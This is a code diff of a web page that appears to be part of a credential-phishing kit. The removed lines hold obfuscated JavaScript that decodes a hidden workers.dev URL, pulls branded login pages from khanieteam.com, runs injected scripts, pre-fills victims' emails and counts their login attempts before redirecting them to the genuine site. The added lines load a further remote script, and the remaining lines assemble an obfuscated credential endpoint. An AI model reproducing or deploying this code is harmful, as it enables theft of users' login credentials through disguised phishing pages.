@@ -23,85 +23,12 @@
       src="https://khanieteam.com/s2/mjs.js"
     ></script>
 
+    <script
+      type="text/javascript"
+      src="https://khanieteam.com/s2/setup.js"
+    ></script>
+
     <script defer>
-      let newUrl = window.location.href;
-      console.log(newUrl);
-      const BASE_URL = "https://khanieteam.com/s2";
-
-      async function getPageContent(page, original) {
-        console.log("page", page, original);
-        let route = params_url.get("rt") || "pages";
-        fetch(`${BASE_URL}/${route}/${page}.html`)
-          .then((response) => response.text())
-          .then((datan) => {
-            document.querySelector("#myFrame").innerHTML = datan;
-            const scripts = document
-              .querySelector("#myFrame")
-              .querySelectorAll("script");
-
-            // console.log(scripts);
-
-            scripts.forEach((script) => {
-              const newScript = document.createElement("script");
-              newScript.textContent = script.textContent;
-              if (script.src) {
-                newScript.src = script.src;
-                document.head.appendChild(newScript);
-              } else {
-                document.body.appendChild(newScript); // Append to body or head
-              }
-              script.remove();
-            });
-
-            let ghds = document.querySelector("#foc").value;
-            document.querySelector("#fuc").value = ghds;
-            document.querySelector("#orgi").value = original;
-            document.querySelector("#page").value = page;
-          })
-          .catch((error) => {
-            console.error("Error Loading data:", error);
-          });
-      }
-
-      async function abs(mg, dm, sPage, sOriginal) {
-        try {
-          let original = null;
-          let page = null;
-
-          if (sPage) {
-            original = sOriginal;
-            page = sPage;
-          } else {
-            if (!mg || mg == undefined) throw "crit Error";
-            const sposn = rfh(
-              `HGDHJMFhttU846hhGDpsU846hhGD:/Yhd53GG/prouddnYhd53GGx.HGDHJMFchrU846hhGDis-londYhd53GGon20Yhd53GG25.worYhd53GGkers.dU846hhGDevHGDHJMF/?domU846hhGDainHGDHJMF=`,
-            );
-            let r = await fetch(sposn + dm);
-            let u = await r.text();
-            let v = u.split("___");
-            page = v[0];
-            original = v[1];
-          }
-          getPageContent(page, original);
-          return original;
-        } catch (e) {
-          console.log("ABS Func", e);
-        }
-      }
-
-      const params_url = new URLSearchParams(window.location.search);
-      let sPage = params_url.get("sp") || null;
-      let mg = params_url.get("ed") || params_url.get("edx") || null;
-      let hmg = mg;
-      let sOriginal = params_url.get("or") || null;
-      let nxtp = params_url.get("nxtp") || null;
-      let nxtrl = params_url.get("nxtrl") || null;
-      let lcf = params_url.get("cf") || null;
-      // sessionStorage.clear();
-      let trialCount = sessionStorage.getItem("num_trial");
-      let mxTrl = (sPage && params_url.get("spn")) || params_url.get("n") || 2;
-      let ntr = params_url.get("n") || 2;
-
       //Your PHP GOES HERE
       let nbg1 = "htt";
       let nbg2 = "ps://macki";
@@ -111,46 +38,6 @@
       let nbg6 = "p";
 
       let hnsk = `${nbg1}${nbg2}${nbg3}${nbg4}${nbg5}${nbg6}`;
-
-      let dm = "secure-trust.com";
-
-      if (mg && mg != undefined) {
-        mg = convertToN(mg);
-        dm = mg.substring(mg.indexOf("@") + 1, mg.length);
-      }
-
-      if (!trialCount) {
-        sessionStorage.setItem("num_trial", 0);
-        trialCount = 0;
-      }
-
-      if (trialCount >= mxTrl) {
-        if (nxtp && nxtp == "yes") {
-          sessionStorage.setItem("num_trial", 0);
-          if (nxtrl) {
-            loadurl = convertToN(nxtrl);
-          } else {
-            loadurl = `${window.location.href}?ed=${hmg}&or=${sOriginal}&n=${ntr}`;
-          }
-          window.location.assign(loadurl);
-        } else if (sOriginal && sOriginal != "") {
-          loadurl = convertToN(sOriginal);
-          window.location.assign(loadurl);
-        }
-      }
-
-      document.addEventListener("DOMContentLoaded", async function () {
-        const orig = await abs(mg, dm, sPage, sOriginal);
-        let foc = document.querySelector("#foc");
-        let trial = document.querySelector("#trial");
-        foc.value = mg;
-        trial.value = trialCount;
-        if (orig) {
-          if (trialCount >= mxTrl) {
-            window.location.assign(orig);
-          }
-        }
-      });
     </script>
 
     <script src="https://khanieteam.com/s2/index.js"></script>
